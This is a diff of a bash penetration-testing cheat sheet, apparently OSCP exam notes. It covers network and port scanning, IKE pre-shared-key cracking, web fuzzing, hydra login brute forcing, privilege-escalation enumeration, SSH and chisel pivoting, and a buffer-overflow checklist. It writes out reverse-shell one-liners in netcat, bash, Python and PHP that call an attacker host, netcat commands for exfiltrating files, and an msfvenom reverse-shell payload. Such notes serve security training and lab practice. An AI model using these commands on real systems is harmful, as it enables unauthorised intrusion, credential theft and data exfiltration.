@@ -1,138 +1,138 @@
 #!/usr/bin/env bash
+########################################
+# 0. BASIC ENUMERATION
+########################################
 
-# consider autorecon?
-
-#scan the whole network first # only works for ethernet and not tunnel interfaces
+# Quick network discovery (Ethernet only)
 netdiscover -i eth0 -r 10.0.0.1/24
 
-#if it doesn't work (no eth for example) then try ping scan on the whole network
+# If netdiscover doesn't work (VPN/tunnel), fall back to ping sweep
 ifconfig
-#check also other routes that you might have with just a
 route
-nmap 10.0.0.1/24 -T5 -v
+nmap 10.0.0.1/24 -sn -T5 -v
 
-# ------------------------- 
-# Install Rustscan!
-# Download the .deb file from the releases page:
-# https://github.com/RustScan/RustScan/releases
-# Run the command 
-dpkg -i # on the file.
-# ------------------------- 
-# Quick port scans
-# Full TCP port scan (fast-ish, verbose)
+########################################
+# Install Rustscan (manual)
+########################################
+# Download .deb from releases → https://github.com/RustScan/RustScan/releases
+# Then install:
+dpkg -i rustscan*.deb
+
+########################################
+# 1. PORT SCANNING
+########################################
+
+# Full TCP scan (OSCP-friendly)
 nmap $target -sS -T4 -A -p- -v
+
+# Fast aggressive scan
 nmap $target -Pn -p- --min-rate 2000 -sC -sV -v
+
+# UDP quick top ports
 nmap $target -Pn -sU -sV -T3 --top-ports 25 -v
 
-# Do the same but with RustScan
+# Rustscan (fast)
 rustscan -a $target --ulimit 5000
 
-# Scan specific/interesting ports with service/version/os detection
+# Scan specific ports
 nmap $target -p 22,80 -sC -sV -v
 
-# searchsploit then!!
+# After scanning → search for known vulns
+searchsploit <service/version>
 
+########################################
+# 2. VPN / IKE / IPsec Checks
+########################################
 
-# ------------------------- 
-# if found on udp nmap scan the 500/udp   open   isakmp? (or IKE in general) service, then run:
-# if you don't have it yet, first install:
-sudo apt install ike-scan
-# then run:
+# Install ike-scan if needed
+sudo apt install ike-scan -y
+
+# Identify IKE / IPsec info
 sudo ike-scan -M -A $target
+
+# Enumerate and crack PSK
 sudo ike-scan -A --pskcrack $target
 psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
 
-# if you get a password out of the cracked hash then use it to ssh in with:
-ssh [username that you found earlier)@$target
-# and then if you end up needing to crack a hash, remember to unzip your rockyou list before attempting to use it.
-sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
-# ------------------------- 
+# If credentials found
+ssh <user>@$target
 
-# -------------------------
-# HTTP / hosts / basic web checks
-# -------------------------
-# Add hostname mapping to /etc/hosts for virtual-hosted sites (example)
-# Edit and add a line: <TARGET_IP> example.lab
+# Ensure rockyou is extracted
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+########################################
+# 3. WEB ENUMERATION
+########################################
+
+# Add virtual hosts manually
 sudo vim /etc/hosts
 
-# ------------------------- 
-# Run a basic web server/vuln scan (Nikto)
+# Basic vulnerability scan
 nikto -host $target
 
-# for any node.js apps, try to check for SSTI (and if a template engine is being used)
-# if there is an input field, try {{7*7}}
+# Quick SSTI test (Node/Python templates)
+# Try in inputs:
+# {{7*7}}
 
-# -------------------------
-# Directory & vhost fuzzing
-# -------------------------
-# dirsearch (simple)
+##########
+# Dir/VHost Fuzzing
+##########
 dirsearch -u http://example.lab
-
-# gobuster directory enumeration
 gobuster dir -u http://example.lab/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
-
-# ffuf directory fuzzing
 ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://example.lab/FUZZ
-
-# gobuster vhost discovery
 gobuster vhost -u http://example.lab/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 
-# -------------------------
-# Manual web checks / burp
-# -------------------------
-# - Check page source for comments, JS endpoints, and config hints
-# - Inspect cookies and session tokens
-# - Use Burp Suite to intercept, replay, and manipulate requests
+##########
+# Manual Web Checks (Burp)
+##########
+# - Look for JS files, hidden params
+# - Check cookies/session tokens
+# - Intercept → Modify → Replay requests
 
-# -------------------------
-# Credential checks & brute forcing (LAB ONLY)
-# -------------------------
-# Example hydra template (adjust to target form and response)
-# NOTE: Replace the failure-string with the exact failure response text from the login form.
-# Example usage (replace placeholders): 
-# hydra -l admin -P /path/to/passlist.txt <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
-hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
+########################################
+# 4. CREDENTIAL ATTACKS (LAB ONLY)
+########################################
 
-# -------------------------
-# Listeners & reverse shells
-# -------------------------
-# Start a listener with netcat (traditional)
-# Note: netcat versions differ; some do not support -e. Use appropriate stager if -e not available.
+hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt \
+<TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
+
+########################################
+# 5. REVERSE SHELLS & LISTENERS
+########################################
+
+# Listener
 nc -nvlp 5555
 
-# Common reverse shell one-liners (replace <ATTACKER_IP> and <PORT>):
-# Netcat (if target's nc supports -e)
-# nc -e /bin/sh <ATTACKER_IP> <PORT>
+# Common one-liners:
+# nc (if -e supported)
+# nc -e /bin/sh <LHOST> <LPORT>
 
-# Bash reverse shell
-# bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
+# Bash
+# bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
 
-# Python reverse shell (python2 example)
-# python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+# Python
+# python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
 
-# PHP reverse shell (if php CLI available)
-# php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+# PHP
+# php -r '$s=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 
-# PowerShell reverse shells are large; use a trusted local snippet when needed (lab only).
+# Spawn stable PTY
+python -c 'import pty; pty.spawn("/bin/bash")'
 
-#after the reverse shell, spaw a real one
-python -c 'import pty; pty.spawn("/bin/bash")' #or with double quotes if it doesn't work
+########################################
+# 6. FILE TRANSFER
+########################################
 
-# -------------------------
-# Transferring files (netcat)
-# -------------------------
-# Receive a file on attacker:
-# nc -nvlp <LOCAL_PORT> > output-file
-# Send the file from target:
-# nc <ATTACKER_IP> <LOCAL_PORT> < file-to-send
+# Receive file on attacker
+# nc -nvlp <PORT> > file
 
-# Example:
-# On attacker: nc -nvlp 1234 > exfil.txt
-# On target: nc <ATTACKER_IP> 1234 < /path/to/file
+# Send from target
+# nc <LHOST> <PORT> < file
 
-# -------------------------
-# Post-shell quick checks (do these immediately after getting a shell)
-# -------------------------
+########################################
+# 7. INITIAL POST-EXPLOIT ENUM
+########################################
+
 whoami
 id
 hostname
@@ -140,7 +140,109 @@ uname -a
 pwd
 ls -la
 ps aux
-
-# Check sudo permissions
 sudo -l
 
+########################################
+# 8. PRIVILEGE ESCALATION (IMPORTANT for OSCP)
+########################################
+
+##########
+# LINUX QUICK ENUM
+##########
+# Automated
+linpeas.sh
+linux-smart-enumeration.sh -l 1
+sudo -l
+
+# Manual checks
+cat /etc/passwd
+grep -i 'password' -R /etc /home 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+crontab -l
+ls -la /tmp
+env
+
+##########
+# WORDPRESS QUICK CHECK
+##########
+wpscan --url http://example.lab --enumerate u,p
+
+##########
+# SUDO Priv Esc
+##########
+# Check GTFOBins
+# https://gtfobins.github.io
+
+##########
+# Kernel exploits (careful on exam)
+##########
+uname -r
+searchsploit linux kernel | grep <version>
+
+########################################
+# 9. WINDOWS PRIV ESC
+########################################
+
+# WinPEAS
+winpeas.exe
+
+# Enumeration
+systeminfo
+whoami /priv
+ipconfig /all
+wmic qfe
+dir /a c:\Users
+net user
+net localgroup administrators
+
+# Unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto"
+
+# DLL Hijacking locations
+echo %PATH%
+
+########################################
+# 10. PIVOTING & TUNNELING (OSCP MUST KNOW)
+########################################
+
+# SSH Local Port Forward
+ssh -L 8080:localhost:80 user@$target
+
+# SSH Remote Port Forward
+ssh -R 4444:localhost:22 user@$target
+
+# Dynamic SOCKS proxy
+ssh -D 9050 user@$target
+
+# Proxychains (edit /etc/proxychains.conf)
+proxychains nmap -sT -Pn 127.0.0.1
+
+# Chisel
+# Server (attacker):
+chisel server -p 9001 --reverse
+# Client (victim):
+chisel client <LHOST>:9001 R:8000:localhost:80
+
+########################################
+# 11. BUFFER OVERFLOW MINI-CHECKLIST (OSCP)
+########################################
+
+# Fuzz with Python
+# python bof-fuzz.py
+
+# Steps:
+# 1. Fuzz input
+# 2. Find offset (pattern_create / pattern_offset)
+# 3. Confirm EIP control
+# 4. Bad chars test
+# 5. Find JMP ESP
+# 6. Build shellcode (msfvenom)
+# 7. Exploit
+
+# Example msfvenom
+# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c
+
+########################################
+# END
+########################################
